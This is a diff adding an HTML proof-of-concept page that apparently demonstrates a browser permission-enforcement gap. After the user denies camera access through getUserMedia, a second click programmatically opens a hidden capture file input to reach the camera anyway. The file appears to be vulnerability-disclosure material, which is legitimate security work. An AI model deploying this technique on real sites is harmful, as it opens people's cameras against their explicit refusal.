@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Camera Permission Bypass PoC – Olivier Version</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding: 50px;
+      }
+      #status {
+        margin-bottom: 20px;
+        color: blue;
+        font-weight: bold;
+      }
+      .btn {
+        padding: 15px 25px;
+        font-size: 18px;
+        cursor: pointer;
+        background: #007bff;
+        color: white;
+        border: none;
+        border-radius: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>PoC: Permission Enforcement Gap</h2>
+    <p id="status">Instructions: Click the button below twice.</p>
+
+    <input
+      type="file"
+      id="f"
+      accept="image/*"
+      capture="environment"
+      style="display: none"
+    />
+
+    <button id="btn-trigger" class="btn">CLICK HERE</button>
+
+    <script>
+      let requested = false;
+      const statusText = document.getElementById("status");
+      const btn = document.getElementById("btn-trigger");
+
+      document.onclick = async () => {
+        if (!requested) {
+          // FIRST TAP: Trigger camera permission prompt (MediaStream)
+          requested = true;
+          statusText.innerText =
+            "Status: Requesting camera permission... (PLEASE CLICK 'DON'T ALLOW')";
+          console.log("Tap 1: Attempting getUserMedia...");
+
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+              video: { facingMode: "environment" },
+              audio: false,
+            });
+            statusText.innerText =
+              "Status: Permission Granted (This is not expected for this test — please deny)";
+          } catch (x) {
+            // Reached when the user clicks "Don't Allow"
+            statusText.innerText =
+              "Status: PERMISSION DENIED! Now click once more.";
+            console.log("Permission denied by user.");
+          }
+        } else {
+          // SECOND TAP: Trigger camera via input capture
+          statusText.innerText =
+            "Status: Triggering camera despite denied permission...";
+          console.log("Tap 2: Programmatically clicking file input capture...");
+          document.getElementById("f").click();
+        }
+      };
+    </script>
+  </body>
+</html>
